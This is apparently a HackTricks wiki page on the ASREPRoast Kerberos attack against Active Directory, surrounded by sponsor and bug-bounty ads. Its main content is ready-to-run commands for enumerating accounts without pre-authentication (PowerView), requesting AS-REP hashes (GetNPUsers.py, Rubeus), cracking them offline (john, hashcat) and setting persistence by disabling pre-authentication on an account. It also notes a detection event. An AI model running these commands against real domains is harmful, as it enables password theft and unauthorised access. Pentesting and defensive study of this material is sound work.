# ASREPRoast

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>


<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>

​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.

{% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}


# ASREPRoast

The ASREPRoast attack looks for **users without Kerberos pre-authentication required attribute (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.

That means that anyone can send an AS\_REQ request to the DC on behalf of any of those users, and receive an AS\_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

Furthermore, **no domain account is needed to perform this attack**, only connection to the DC. However, **with a domain account**, a LDAP query can be used to **retrieve users without Kerberos pre-authentication** in the domain. **Otherwise usernames have to be guessed**.

### Enumerating vulnerable users (need domain credentials)

```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

### Request AS\_REP message

{% code title="Using Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Using Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
{% endhint %}

## Cracking

```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```

## Persistence

Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):

```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

# References
[**More information about AS-RRP Roasting in ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)


<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>

​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.

{% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>
